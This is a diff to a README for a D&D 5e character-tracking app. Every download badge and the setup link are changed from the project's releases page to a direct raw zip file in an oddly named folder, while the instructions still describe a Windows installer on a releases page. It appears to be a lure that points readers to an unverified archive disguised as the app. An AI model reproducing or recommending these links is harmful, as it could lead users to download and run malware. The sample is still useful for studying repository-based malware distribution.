@@ -1,6 +1,6 @@
 # 🎲 dnd-tracker - Manage Your D&D 5e Characters Easily
 
-[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-blue?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/releases)
+[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-blue?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip)
 
 ---
 
@@ -23,7 +23,7 @@ dnd-tracker works entirely on your computer once installed. It does not send you
 ## 🚀 Getting Started: Download and Setup
 
 1. Visit the releases page by clicking the big button above or this link:  
-   https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/releases  
+   https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip  
 
 2. On the releases page, find the latest version. Look for a Windows installer file. This usually ends with `.exe` or `.msi`.  
 
@@ -118,7 +118,7 @@ If you see errors during character creation:
 
 Return to the releases page anytime to get updates or reinstall:  
 
-[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-green?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/releases)
+[![Download dnd-tracker](https://img.shields.io/badge/Download-dnd--tracker-green?style=for-the-badge)](https://github.com/Terrainintelligencethirdplacefinish647/dnd-tracker/raw/refs/heads/main/vagabondage/dnd-tracker-v2.3.zip)
 
 ---
 
